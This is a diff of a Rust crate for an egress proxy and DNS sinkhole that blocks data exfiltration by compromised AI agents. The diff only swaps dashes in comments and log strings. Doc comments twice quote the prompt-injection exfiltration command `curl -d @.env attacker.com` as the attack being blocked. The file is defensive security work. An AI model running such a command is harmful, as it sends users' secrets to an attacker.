@@ -1,5 +1,5 @@
 #![allow(dead_code, unused_variables)]
-//! # secureops-proxy — the egress PEP (Policy Enforcement Point)
+//! # secureops-proxy - the egress PEP (Policy Enforcement Point)
 //!
 //! This crate is the **single highest-impact enforcement component** in SecureOps:
 //! it neutralizes data exfiltration *regardless of how the agent was compromised*
@@ -11,8 +11,8 @@
 //! 1. Agent (Ring 0) attempts an outbound connection. DNS goes to the local
 //!    [`DnsSinkhole`]; raw connects are routed to the local [`EgressProxy`]
 //!    (transparent redirect or explicit `HTTPS_PROXY`).
-//! 2. The proxy reads the **SNI / requested host** — *no MITM, no certificate
-//!    interception by default* (see [`PeekedHost`]) — and asks the PDP:
+//! 2. The proxy reads the **SNI / requested host** - *no MITM, no certificate
+//!    interception by default* (see [`PeekedHost`]) - and asks the PDP:
 //!    *is this destination allowed for this process?*
 //! 3. The PDP evaluates policy + accumulated per-PID process context (e.g. "this PID
 //!    `openat`'d a credential file 200ms ago") and returns [`Decision::Allow`],
@@ -23,7 +23,7 @@
 //!
 //! Concretely, this turns the canonical prompt-injection exfil
 //! `curl -d @.env attacker.com` from *"we'd have a log of it afterward"* into
-//! *"it didn't happen"* — the unknown host is hard-RST at the proxy (PRODUCT.md
+//! *"it didn't happen"* - the unknown host is hard-RST at the proxy (PRODUCT.md
 //! Part D, row 1).
 //!
 //! ## Fail-closed is the contract (PRODUCT.md W0)
@@ -36,7 +36,7 @@
 //! > rather than pretend it has kernel deny.
 //!
 //! In this crate that means: **any** error, PDP timeout, PDP-unreachable, or unknown
-//! destination resolves to a hard RST / sinkholed answer — never to an open
+//! destination resolves to a hard RST / sinkholed answer - never to an open
 //! connection. See [`FailMode`] (defaults to [`FailMode::Closed`]) and
 //! [`EgressProxy::on_error`].
 
@@ -116,7 +116,7 @@ pub trait PolicyDecisionPoint: Send + Sync {
 /// How the PEP behaves when it cannot get a definitive `Allow` (PDP error/timeout,
 /// observe-only platform, malformed handshake, …).
 ///
-/// Per PRODUCT.md W0 the default is — and on observe-only platforms MUST remain —
+/// Per PRODUCT.md W0 the default is - and on observe-only platforms MUST remain -
 /// [`FailMode::Closed`].
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 pub enum FailMode {
@@ -138,7 +138,7 @@ pub enum EnforcementTier {
     /// Observe-only kernel layer (macOS Endpoint Security is mostly observe);
     /// the proxy is the *sole* hard deny and MUST be fail-closed.
     ObserveOnly,
-    /// Proxy-only — no kernel layer wired at all; fully reliant on this PEP.
+    /// Proxy-only - no kernel layer wired at all; fully reliant on this PEP.
     ProxyOnly,
 }
 
@@ -164,7 +164,7 @@ impl EnforcementTier {
 }
 
 // =============================================================================
-// EgressProxy — forward proxy PEP (PRODUCT.md B.5)
+// EgressProxy - forward proxy PEP (PRODUCT.md B.5)
 // =============================================================================
 
 /// Local forward proxy that authorizes every outbound agent connection.
@@ -195,7 +195,7 @@ impl EgressProxy {
     }
 
     /// Bind the proxy listener on `addr` and serve forever, authorizing each
-    /// connection against `pdp` (PRODUCT.md B.5 — the headline path).
+    /// connection against `pdp` (PRODUCT.md B.5 - the headline path).
     ///
     /// Per accepted connection the real implementation will, in order:
     /// 1. Peek the first record to extract SNI / `CONNECT` host **without MITM**
@@ -239,7 +239,7 @@ impl EgressProxy {
     fn hard_rst(&self, decision: Decision) -> anyhow::Result<()> {
         tracing::warn!(
             ?decision,
-            "egress hard RST — 0 bytes left the box (PRODUCT.md B.5 step 4)"
+            "egress hard RST - 0 bytes left the box (PRODUCT.md B.5 step 4)"
         );
         Ok(())
     }
@@ -253,7 +253,7 @@ impl EgressProxy {
                     self.tier != EnforcementTier::ObserveOnly,
                     "PRODUCT.md W0: FailMode::Open is forbidden on observe-only platforms"
                 );
-                tracing::warn!(%err, "egress error in FailMode::Open (UNSAFE, debug-only) — allowing");
+                tracing::warn!(%err, "egress error in FailMode::Open (UNSAFE, debug-only) - allowing");
                 Ok(())
             }
         }
@@ -280,7 +280,7 @@ fn parse_connect_target(target: &str) -> Option<(String, u16)> {
 
 /// Handle one proxied connection: read the HTTP `CONNECT` request, ask the PDP,
 /// and either tunnel to the upstream ([`Decision::Allow`]) or refuse with `403`
-/// **without ever contacting the upstream** (Deny/Escalate → 0 bytes leave —
+/// **without ever contacting the upstream** (Deny/Escalate → 0 bytes leave -
 /// PRODUCT.md B.5 step 4 / Part D row 1). Fail-closed on any error (W0).
 pub async fn handle_connection(
     mut client: TcpStream,
@@ -337,7 +337,7 @@ pub async fn handle_connection(
     if decision != Decision::Allow {
         // Hard deny: refuse and close. Upstream was never contacted.
         let _ = client.write_all(b"HTTP/1.1 403 Forbidden\r\n\r\n").await;
-        tracing::warn!(%host, port, ?decision, "egress DENIED — 0 bytes left the box");
+        tracing::warn!(%host, port, ?decision, "egress DENIED - 0 bytes left the box");
         return Ok(());
     }
 
@@ -357,7 +357,7 @@ pub async fn handle_connection(
 }
 
 /// A concrete, dependency-free [`PolicyDecisionPoint`]: allow a connection only
-/// when its host is in the egress allowlist (everything else denied —
+/// when its host is in the egress allowlist (everything else denied -
 /// fail-closed). Mirrors `secureops.network.egressAllowlist` (PRODUCT.md B.3
 /// network module / B.5).
 pub struct AllowlistPdp {
@@ -394,7 +394,7 @@ impl PolicyDecisionPoint for AllowlistPdp {
 }
 
 // =============================================================================
-// DnsSinkhole — DNS PEP (PRODUCT.md B.5 step 1, Part D row "C2 over fresh domain")
+// DnsSinkhole - DNS PEP (PRODUCT.md B.5 step 1, Part D row "C2 over fresh domain")
 // =============================================================================
 
 /// Local DNS authority that swallows lookups for disallowed / unknown names.
@@ -416,7 +416,7 @@ pub struct DnsSinkhole {
 impl DnsSinkhole {
     /// Construct a fail-closed DNS sinkhole with an empty allowlist: any name not
     /// on the allowlist resolves to `NXDOMAIN`, never to the real address
-    /// (PRODUCT.md W0 — fail-closed by construction).
+    /// (PRODUCT.md W0 - fail-closed by construction).
     pub fn new() -> Self {
         Self {
             allow_hosts: HashSet::new(),
@@ -424,7 +424,7 @@ impl DnsSinkhole {
         }
     }
 
-    /// Set the egress allowlist — only these hostnames are forwarded upstream.
+    /// Set the egress allowlist - only these hostnames are forwarded upstream.
     pub fn with_allowlist(mut self, hosts: impl IntoIterator<Item = impl Into<String>>) -> Self {
         self.allow_hosts = hosts.into_iter().map(Into::into).collect();
         self
@@ -457,7 +457,7 @@ impl DnsSinkhole {
             let msg = match Message::from_vec(raw) {
                 Ok(m) => m,
                 Err(e) => {
-                    tracing::debug!(%src, %e, "DNS parse error — dropping");
+                    tracing::debug!(%src, %e, "DNS parse error - dropping");
                     continue;
                 }
             };
@@ -480,7 +480,7 @@ impl DnsSinkhole {
                 }
             } else {
                 // Sinkhole: NXDOMAIN, 0 bytes to the real destination.
-                tracing::warn!(%hostname, %src, "DNS SINKHOLED — NXDOMAIN (PRODUCT.md W0)");
+                tracing::warn!(%hostname, %src, "DNS SINKHOLED - NXDOMAIN (PRODUCT.md W0)");
                 let nxdomain = build_nxdomain(&msg);
                 let _ = socket.send_to(&nxdomain, src).await;
             }
@@ -527,7 +527,7 @@ impl Default for DnsSinkhole {
 
 /// Build the [`AuditFinding`] recorded for a single egress decision.
 ///
-/// Every connection — allowed or denied — yields exactly one signed-audit entry
+/// Every connection - allowed or denied - yields exactly one signed-audit entry
 /// (PRODUCT.md B.5 step 4). `secureops-daemon` forwards the returned finding to the
 /// hash-chained `secureops-auditlog`. A [`Decision::Deny`] is the canonical
 /// `curl -d @.env attacker.com` block (PRODUCT.md Part D row 1).
@@ -548,19 +548,19 @@ pub fn egress_finding(req: &ConnectionRequest, decision: Decision) -> secureops_
             Severity::Info,
             "ASI01",
             "Egress connection allowed",
-            format!("host={host} pid={pid_str} — allowed by policy"),
+            format!("host={host} pid={pid_str} - allowed by policy"),
         ),
         Decision::Deny => (
             Severity::High,
             "ASI05",
-            "Egress connection BLOCKED — potential data exfiltration",
-            format!("host={host} pid={pid_str} — denied by policy, 0 bytes left the box"),
+            "Egress connection BLOCKED - potential data exfiltration",
+            format!("host={host} pid={pid_str} - denied by policy, 0 bytes left the box"),
         ),
         Decision::Escalate => (
             Severity::Critical,
             "ASI05",
-            "Egress connection ESCALATED — suspicious exfil pattern",
-            format!("host={host} pid={pid_str} — escalated (exfil chain suspected, circuit breaker tripped)"),
+            "Egress connection ESCALATED - suspicious exfil pattern",
+            format!("host={host} pid={pid_str} - escalated (exfil chain suspected, circuit breaker tripped)"),
         ),
     };
 
